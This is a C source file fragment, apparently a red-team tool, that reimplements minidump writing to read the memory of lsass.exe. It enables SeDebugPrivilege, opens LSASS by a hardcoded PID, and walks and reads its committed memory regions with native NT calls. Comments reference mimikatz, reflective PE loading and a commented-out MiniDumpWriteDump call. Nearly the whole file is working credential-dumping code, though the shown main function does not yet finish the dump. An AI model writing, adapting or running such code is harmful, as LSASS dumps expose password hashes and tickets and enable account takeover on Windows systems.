	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(tokenPriv, false, &priv, 0, 0, 0)) {
		status = false;
		goto EXIT;
	}
EXIT:
	if (tokenPriv) {
		CloseHandle(tokenPriv);
		return status;
	}
	return status;
}

/**************************************************************************/

#define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define STATUS_SUCCESS 0

typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS                ExitStatus;
	PVOID                   TebBaseAddress;
	CLIENT_ID               ClientId;
	KAFFINITY               AffinityMask;
	KPRIORITY               Priority;
	KPRIORITY               BasePriority;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;

typedef DWORD   RVA;
typedef ULONG64 RVA64;

struct process
{
	struct process* next;
	HANDLE                      handle;
	const struct loader_ops* loader;
	WCHAR* search_path;
	WCHAR* environment;

	PSYMBOL_REGISTERED_CALLBACK64       reg_cb;
	PSYMBOL_REGISTERED_CALLBACK reg_cb32;
	BOOL                        reg_is_unicode;
	DWORD64                     reg_user;

	struct module* lmodules;
	ULONG_PTR                   dbg_hdr_addr;

	IMAGEHLP_STACK_FRAME        ctx_frame;

	unsigned                    buffer_size;
	void* buffer;

	BOOL                        is_64bit;
};

struct dump_context
{
	/* process & thread information */
	struct process* process;
	DWORD                               pid;
	HANDLE                              handle;
	unsigned                            flags_out;
	/* thread information */
	struct dump_thread* threads;
	unsigned                            num_threads;
	/* module information */
	struct dump_module* modules;
	unsigned                            num_modules;
	unsigned                            alloc_modules;
	/* exception information */
	/* output information */
	MINIDUMP_TYPE                       type;
	HANDLE                              hFile;
	RVA                                 rva;
	struct dump_memory* mem;
	unsigned                            num_mem;
	unsigned                            alloc_mem;
	struct dump_memory64* mem64;
	unsigned                            num_mem64;
	unsigned                            alloc_mem64;
	/* callback information */
	MINIDUMP_CALLBACK_INFORMATION* cb;
};

struct line_info
{
	ULONG_PTR                   is_first : 1,
		is_last : 1,
		is_source_file : 1,
		line_number;
	union
	{
		ULONG_PTR                   pc_offset;   /* if is_source_file isn't set */
		unsigned                    source_file; /* if is_source_file is set */
	} u;
};

struct module_pair
{
	struct process* pcs;
	struct module* requested; /* in:  to module_get_debug() */
	struct module* effective; /* out: module with debug info */
};

enum pdb_kind { PDB_JG, PDB_DS };

struct pdb_lookup
{
	const char* filename;
	enum pdb_kind               kind;
	DWORD                       age;
	DWORD                       timestamp;
	GUID                        guid;
};

struct cpu_stack_walk
{
	HANDLE                      hProcess;
	HANDLE                      hThread;
	BOOL                        is32;
	struct cpu* cpu;
	union
	{
		struct
		{
			PREAD_PROCESS_MEMORY_ROUTINE        f_read_mem;
			PTRANSLATE_ADDRESS_ROUTINE          f_xlat_adr;
			PFUNCTION_TABLE_ACCESS_ROUTINE      f_tabl_acs;
			PGET_MODULE_BASE_ROUTINE            f_modl_bas;
		} s32;
		struct
		{
			PREAD_PROCESS_MEMORY_ROUTINE64      f_read_mem;
			PTRANSLATE_ADDRESS_ROUTINE64        f_xlat_adr;
			PFUNCTION_TABLE_ACCESS_ROUTINE64    f_tabl_acs;
			PGET_MODULE_BASE_ROUTINE64          f_modl_bas;
		} s64;
	} u;
};

struct dump_memory
{
	ULONG64                             base;
	ULONG                               size;
	ULONG                               rva;
};

struct dump_memory64
{
	ULONG64                             base;
	ULONG64                             size;
};

struct dump_module
{
	unsigned                            is_elf;
	ULONG64                             base;
	ULONG                               size;
	DWORD                               timestamp;
	DWORD                               checksum;
	WCHAR                               name[MAX_PATH];
};

struct dump_thread
{
	ULONG                               tid;
	ULONG                               prio_class;
	ULONG                               curr_prio;
};


BOOL fetch_process_info(struct dump_context* dc)
{
	ULONG       buf_size = 0x1000;
	NTSTATUS    nts;
	SYSTEM_PROCESS_INFORMATION* pcs_buffer;
	unsigned char* raw = malloc(sizeof(SYSTEM_PROCESS_INFORMATION));

	if (!(pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)HeapAlloc(GetProcessHeap(), 0, buf_size))) {
		printf("fetch_process_info IF A\n");
		return FALSE;
	}
		

	for (;;)
	{
		nts = NtQuerySystemInformation(SystemProcessInformation, pcs_buffer, buf_size, NULL);
		raw = (unsigned char*)pcs_buffer;
		for (int i = 0; i < sizeof(SYSTEM_PROCESS_INFORMATION); ++i) {
			printf("%02X", raw[i]);
		}
		printf("\n");
		
		
		if (nts != 0xC0000004L)
			break;


		pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)HeapReAlloc(GetProcessHeap(), 0, pcs_buffer, buf_size *= 2);
		if (!pcs_buffer)
			return FALSE;
	}

	if (nts == 0)
	{
		printf("fetch_process_info IF B\n");
		SYSTEM_PROCESS_INFORMATION* spi = pcs_buffer;

		for (;;)
		{
			if (HandleToUlong(spi->UniqueProcessId) == dc->pid)
			{
				printf("fetch_process_info IF C\n");
				dc->num_threads = spi->NumberOfThreads;
				printf("nbThreads = %d\n", dc->num_threads);
				dc->threads = HeapAlloc(GetProcessHeap(), 0, dc->num_threads * sizeof(dc->threads[0]));
				if (!dc->threads)
					goto failed;

				HeapFree(GetProcessHeap(), 0, pcs_buffer);
				return TRUE;
			}

			if (!spi->NextEntryOffset)
				break;

			spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
		}
	}


failed:
	printf("fetch_process_info END\n");
	HeapFree(GetProcessHeap(), 0, pcs_buffer);
	return FALSE;
}

void writeat(struct dump_context* dc, RVA rva, const void* data, unsigned size)
{
	DWORD written;

	SetFilePointer(dc->hFile, rva, NULL, FILE_BEGIN);
	WriteFile(dc->hFile, data, size, &written, NULL);
}

void append(struct dump_context* dc, const void* data, unsigned size)
{
	writeat(dc, dc->rva, data, size);
	dc->rva += size;
}

unsigned dump_system_info(struct dump_context* dc)
{
	MINIDUMP_SYSTEM_INFO        mdSysInfo;
	SYSTEM_INFO                 sysInfo;
	OSVERSIONINFOW              osInfo;
	DWORD                       written;
	ULONG                       slen;
	DWORD                       wine_extra = 0;

	const char* build_id = NULL;
	const char* sys_name = NULL;
	const char* release_name = NULL;

	GetSystemInfo(&sysInfo);
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	typedef int(WINAPI* RtlGetNtVersionNumbers)(PDWORD, PDWORD, PDWORD);

	HINSTANCE hinst = LoadLibrary("ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	RtlGetNtVersionNumbers proc = (RtlGetNtVersionNumbers)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);
	dwBuildNumber &= 0xffff;
	printf("OS Version: %d.%d.%d\n", dwMajor, dwMinor, dwBuildNumber);
	FreeLibrary(hinst);

	mdSysInfo.ProcessorArchitecture = sysInfo.wProcessorArchitecture;
	mdSysInfo.ProcessorLevel = sysInfo.wProcessorLevel;
	mdSysInfo.ProcessorRevision = sysInfo.wProcessorRevision;
	mdSysInfo.NumberOfProcessors = (UCHAR)sysInfo.dwNumberOfProcessors;
	mdSysInfo.ProductType = VER_NT_WORKSTATION; /* This might need fixing */
	mdSysInfo.MajorVersion = dwMajor;
	mdSysInfo.MinorVersion = dwMinor;
	mdSysInfo.BuildNumber = dwBuildNumber;
	mdSysInfo.PlatformId = 0x2;

	mdSysInfo.CSDVersionRva = dc->rva + sizeof(mdSysInfo) + wine_extra;
	mdSysInfo.Reserved1 = 0;
	mdSysInfo.SuiteMask = VER_SUITE_TERMINAL;

	unsigned        i;
	ULONG64         one = 1;

	mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
	mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

	for (i = 0; i < sizeof(mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++)
		if (IsProcessorFeaturePresent(i))
			mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= one << i;

	append(dc, &mdSysInfo, sizeof(mdSysInfo));

	const WCHAR* szCSDVersion = L"";
	slen = lstrlenW(szCSDVersion) * sizeof(WCHAR);
	WriteFile(dc->hFile, &slen, sizeof(slen), &written, NULL);
	WriteFile(dc->hFile, szCSDVersion, slen, &written, NULL);
	dc->rva += sizeof(ULONG) + slen;

	return sizeof(mdSysInfo);
}

void minidump_add_memory_block(struct dump_context* dc, ULONG64 base, ULONG size, ULONG rva)
{
	if (!dc->mem)
	{
		dc->alloc_mem = 32;
		dc->mem = HeapAlloc(GetProcessHeap(), 0, dc->alloc_mem * sizeof(*dc->mem));
	}
	else if (dc->num_mem >= dc->alloc_mem)
	{
		dc->alloc_mem *= 2;
		dc->mem = HeapReAlloc(GetProcessHeap(), 0, dc->mem, dc->alloc_mem * sizeof(*dc->mem));
	}
	if (dc->mem)
	{
		dc->mem[dc->num_mem].base = base;
		dc->mem[dc->num_mem].size = size;
		dc->mem[dc->num_mem].rva = rva;
		dc->num_mem++;
	}
	else
		dc->num_mem = dc->alloc_mem = 0;
}

void minidump_add_memory64_block(struct dump_context* dc, ULONG64 base, ULONG64 size)
{
	if (!dc->mem64)
	{
		dc->alloc_mem64 = 32;
		dc->mem64 = HeapAlloc(GetProcessHeap(), 0, dc->alloc_mem64 * sizeof(*dc->mem64));
	}
	else if (dc->num_mem64 >= dc->alloc_mem64)
	{
		dc->alloc_mem64 *= 2;
		dc->mem64 = HeapReAlloc(GetProcessHeap(), 0, dc->mem64, dc->alloc_mem64 * sizeof(*dc->mem64));
	}
	if (dc->mem64)
	{
		dc->mem64[dc->num_mem64].base = base;
		dc->mem64[dc->num_mem64].size = size;
		dc->num_mem64++;
	}
	else
		dc->num_mem64 = dc->alloc_mem64 = 0;
}

void fetch_memory64_info(struct dump_context* dc)
{
	ULONG_PTR                   addr;
	MEMORY_BASIC_INFORMATION    mbi;

	addr = 0;
	while (VirtualQueryEx(dc->handle, (LPCVOID)addr, &mbi, sizeof(mbi)) != 0)
	{
		/* Memory regions with state MEM_COMMIT will be added to the dump */
		if (mbi.State == MEM_COMMIT)
			minidump_add_memory64_block(dc, (ULONG_PTR)mbi.BaseAddress, mbi.RegionSize);

		if ((addr + mbi.RegionSize) < addr)
			break;

		addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
	}
}

BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size)
{
	SIZE_T read = 0;
	NTSTATUS res = NtReadVirtualMemory(process, (PVOID*)addr, buf, size, &read);
	return !res;
}

unsigned dump_memory64_info(struct dump_context* dc)
{
	MINIDUMP_MEMORY64_LIST          mdMem64List;
	MINIDUMP_MEMORY_DESCRIPTOR64    mdMem64;
	DWORD                           written;
	unsigned                        i, len, sz;
	RVA                             rva_base;
	char                            tmp[1024];
	ULONG64                         pos;
	LARGE_INTEGER                   filepos;

	sz = sizeof(mdMem64List.NumberOfMemoryRanges) + sizeof(mdMem64List.BaseRva) + dc->num_mem64 * sizeof(mdMem64);

	mdMem64List.NumberOfMemoryRanges = dc->num_mem64;
	mdMem64List.BaseRva = dc->rva + sz;

	append(dc, &mdMem64List.NumberOfMemoryRanges, sizeof(mdMem64List.NumberOfMemoryRanges));
	append(dc, &mdMem64List.BaseRva, sizeof(mdMem64List.BaseRva));

	rva_base = dc->rva;
	dc->rva += dc->num_mem64 * sizeof(mdMem64);

	/* dc->rva is not updated past this point. The end of the dump
	 * is just the full memory data. */
	filepos.QuadPart = dc->rva;
	for (i = 0; i < dc->num_mem64; i++)
	{
		mdMem64.StartOfMemoryRange = dc->mem64[i].base;
		mdMem64.DataSize = dc->mem64[i].size;
		SetFilePointerEx(dc->hFile, filepos, NULL, FILE_BEGIN);
		for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
		{
			len = (unsigned)(min(dc->mem64[i].size - pos, sizeof(tmp)));
			if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len))
				WriteFile(dc->hFile, tmp, len, &written, NULL);
		}
		filepos.QuadPart += mdMem64.DataSize;
		writeat(dc, rva_base + i * sizeof(mdMem64), &mdMem64, sizeof(mdMem64));
	}

	return sz;
}

void fetch_module_versioninfo(LPCWSTR filename, VS_FIXEDFILEINFO* ffi)
{
	DWORD       handle;
	DWORD       sz;
	static const WCHAR backslashW[] = { '\\', '\0' };

	memset(ffi, 0, sizeof(*ffi));
	if ((sz = GetFileVersionInfoSizeW(filename, &handle)))
	{
		void* info = HeapAlloc(GetProcessHeap(), 0, sz);
		if (info && GetFileVersionInfoW(filename, handle, sz, info))
		{
			VS_FIXEDFILEINFO* ptr;
			UINT    len;

			if (VerQueryValueW(info, backslashW, (LPVOID*)&ptr, &len))
				memcpy(ffi, ptr, min(len, sizeof(*ffi)));
		}
		HeapFree(GetProcessHeap(), 0, info);
	}
}

unsigned dump_modules(struct dump_context* dc, BOOL dump_elf)
{
	MINIDUMP_MODULE             mdModule;
	MINIDUMP_MODULE_LIST        mdModuleList;
	char                        tmp[1024];
	MINIDUMP_STRING* ms = (MINIDUMP_STRING*)tmp;
	ULONG                       i, nmod;
	RVA                         rva_base;
	DWORD                       flags_out;
	unsigned                    sz;

	for (i = nmod = 0; i < dc->num_modules; i++)
	{
		if ((dc->modules[i].is_elf && dump_elf) ||
			(!dc->modules[i].is_elf && !dump_elf))
			nmod++;
	}

	mdModuleList.NumberOfModules = 0;
	rva_base = dc->rva;
	dc->rva += sz = sizeof(mdModuleList.NumberOfModules) + sizeof(mdModule) * nmod;

	for (i = 0; i < dc->num_modules; i++)
	{
		if ((dc->modules[i].is_elf && !dump_elf) ||
			(!dc->modules[i].is_elf && dump_elf))
			continue;

		flags_out = ModuleWriteModule | ModuleWriteMiscRecord | ModuleWriteCvRecord;
		if (dc->type & MiniDumpWithDataSegs)
			flags_out |= ModuleWriteDataSeg;
		if (dc->type & MiniDumpWithProcessThreadData)
			flags_out |= ModuleWriteTlsData;
		if (dc->type & MiniDumpWithCodeSegs)
			flags_out |= ModuleWriteCodeSegs;

		ms->Length = (lstrlenW(dc->modules[i].name) + 1) * sizeof(WCHAR);

		lstrcpyW(ms->Buffer, dc->modules[i].name);

		if (flags_out & ModuleWriteModule)
		{
			mdModule.BaseOfImage = dc->modules[i].base;
			mdModule.SizeOfImage = dc->modules[i].size;
			mdModule.CheckSum = dc->modules[i].checksum;
			mdModule.TimeDateStamp = dc->modules[i].timestamp;
			mdModule.ModuleNameRva = dc->rva;
			ms->Length -= sizeof(WCHAR);
			append(dc, ms, sizeof(ULONG) + ms->Length + sizeof(WCHAR));
			fetch_module_versioninfo(ms->Buffer, &mdModule.VersionInfo);
			mdModule.CvRecord.DataSize = 0;
			mdModule.CvRecord.Rva = 0;
			mdModule.MiscRecord.DataSize = 0;
			mdModule.MiscRecord.Rva = 0;
			mdModule.Reserved0 = 0;
			mdModule.Reserved1 = 0;
			writeat(dc,
				rva_base + sizeof(mdModuleList.NumberOfModules) +
				mdModuleList.NumberOfModules++ * sizeof(mdModule),
				&mdModule, sizeof(mdModule));
		}
	}
	writeat(dc, rva_base, &mdModuleList.NumberOfModules, sizeof(mdModuleList.NumberOfModules));

	return sz;
}

BOOL validate_addr64(DWORD64 addr)
{
	if (sizeof(void*) == sizeof(int) && (addr >> 32))
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	return TRUE;
}

BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
{
	IMAGE_DOS_HEADER    dos;

	NTSTATUS res = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);
	NTSTATUS res2 = NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);

	return  !res && dos.e_magic == IMAGE_DOS_SIGNATURE && !res2 && nth->Signature == IMAGE_NT_SIGNATURE;
}

BOOL add_module(struct dump_context* dc, const WCHAR* name, DWORD64 base, DWORD size, DWORD timestamp, DWORD checksum, BOOL is_elf)
{
	if (!dc->modules)
	{
		dc->alloc_modules = 32;
		dc->modules = HeapAlloc(GetProcessHeap(), 0, dc->alloc_modules * sizeof(*dc->modules));
	}
	else if (dc->num_modules >= dc->alloc_modules)
	{
		dc->alloc_modules *= 2;
		dc->modules = HeapReAlloc(GetProcessHeap(), 0, dc->modules, dc->alloc_modules * sizeof(*dc->modules));
	}
	if (!dc->modules)
	{
		dc->alloc_modules = dc->num_modules = 0;
		return FALSE;
	}

	GetModuleFileNameExW(dc->handle, (HMODULE)(DWORD_PTR)base, dc->modules[dc->num_modules].name, ARRAY_SIZE(dc->modules[dc->num_modules].name));

	dc->modules[dc->num_modules].base = base;
	dc->modules[dc->num_modules].size = size;
	dc->modules[dc->num_modules].timestamp = timestamp;
	dc->modules[dc->num_modules].checksum = checksum;
	dc->modules[dc->num_modules].is_elf = is_elf;
	dc->num_modules++;

	return TRUE;
}

BOOL fetch_pe_module_info_cb(PCWSTR name, DWORD64 base, ULONG size, PVOID user)
{
	struct dump_context* dc = user;
	IMAGE_NT_HEADERS            nth;

	if (!validate_addr64(base))
		return FALSE;

	if (pe_load_nt_header(dc->handle, base, &nth))
		add_module(user, name, base, size, nth.FileHeader.TimeDateStamp, nth.OptionalHeader.CheckSum, FALSE);

	return TRUE;
}

void fetch_modules_info(struct dump_context* dc)
{
	if (EnumerateLoadedModulesW64(dc->handle, fetch_pe_module_info_cb, dc) == TRUE) {
		printf("fetch_modules_info OK\n");
	}
	else {
		printf("fetch_modules_info KO\n");
		printf("%llx\n", GetLastError());
	}
}



void EnableDebugPriv()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = { 0 };

	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to open process token.\n");
		return;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, lpwPriv, &tkp.Privileges[0].Luid))
	{
		NtClose(hToken);
		return;
	}

	status = NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS)
		printf("Failed to adjust process token.\n");

	NtClose(hToken);
}

HANDLE GetProcessHandle(DWORD dwPid)
{
	NTSTATUS status;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
	uPid.UniqueThread = (HANDLE)0;

	status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &ObjectAttributes, &uPid);
	if (hProcess == NULL)
	{
		printf("NtOpenProcess error 0x%08x\n", status);
		return NULL;
	}

	return hProcess;
}

/*********************************************************************************************************************/





// exemple: mimikatz
int main(int argc, char *argv[]) {

		//create_box();
		size_t len;
		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
		
		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
		unsigned char* raw = get_file("C:\\users\\sebastien.carre\\minidump.exe", &len);
		
		
		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\seb.txt", &len);
		//for (size_t i = 0; i < len; ++i) {
		//	raw[i] = raw[i] - 1;
		//}
		//UnpackAndRunEp(raw, len, TRUE);

		ListLoadedModules();
		



		if (isElevatedProcess()) {
			printf("We have the required privileges\n");
		}
		else {
			printf("We don't have the required privileges\n");
			return 0;
		}

		char* processName = "lsass.exe";
		DWORD processPID = 2032;
		printf("lsasspid process PID is %d\n", processPID);

		if (setPrivilege()) {
			printf("seDebugPrivilege is enabled\n");
		}
		else {
			printf("seDebugPrivilege is not enabled\n");
			return 0;
		}

		LPCSTR fileName_pointer = "lsass.dump";
		HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
		HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);

		
		/*
		if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
			//patchme();
			printf("in the place\n");
			bool isDump = MiniDumpWriteDump(processHandler, processPID, output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
			if (isDump) {
				printf("[+] lsass is dumped\n");
			}
			else {
				printf("[-] lsass is not dumped\n");
			}
		}
		*/
		HANDLE hProcess = GetProcessHandle(processPID);
		if (!hProcess)
		{
			printf("Failed to open process.\n");
			return 0;
		}
		HANDLE hFile = CreateFileA("C:\\Users\\sebastien.carre\\whitelist\\output.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hFile)
		{
			printf("Failed to write dump: Invalid dump file path.\n");
			return 0;
		}


		static const MINIDUMP_DIRECTORY emptyDir = { UnusedStream, {0, 0} };
		MINIDUMP_HEADER     mdHead;
		MINIDUMP_DIRECTORY  mdDir;
		DWORD               i, nStreams, idx_stream;
		struct dump_context dc;
		BOOL                sym_initialized = FALSE;

		const DWORD Flags = MiniDumpWithFullMemory |
			MiniDumpWithFullMemoryInfo |
			MiniDumpWithUnloadedModules;

		MINIDUMP_TYPE DumpType = (MINIDUMP_TYPE)Flags;
		if (argc == 2) {
			if (!(sym_initialized = SymInitializeW(hProcess, NULL, TRUE)))
			{
				
				DWORD err = GetLastError();
				printf("SymInitializeW FAILS %llx\n",err);
				return FALSE;
			}
		}

		dc.hFile = hFile;
		dc.pid = processPID;
		dc.handle = hProcess;
		dc.modules = NULL;
		dc.num_modules = 0;
		dc.alloc_modules = 0;
		dc.threads = NULL;
		dc.num_threads = 0;
		dc.type = DumpType;
		dc.mem = NULL;
		dc.num_mem = 0;
		dc.alloc_mem = 0;
		dc.mem64 = NULL;
		dc.num_mem64 = 0;
		dc.alloc_mem64 = 0;
		dc.rva = 0;

		if (!fetch_process_info(&dc))
			return FALSE;
		printf("TEST2\n");
		fetch_modules_info(&dc);


		//dump_system_info();

		printf("Press any key to continue");
		getchar();

	
	
	return 0;
}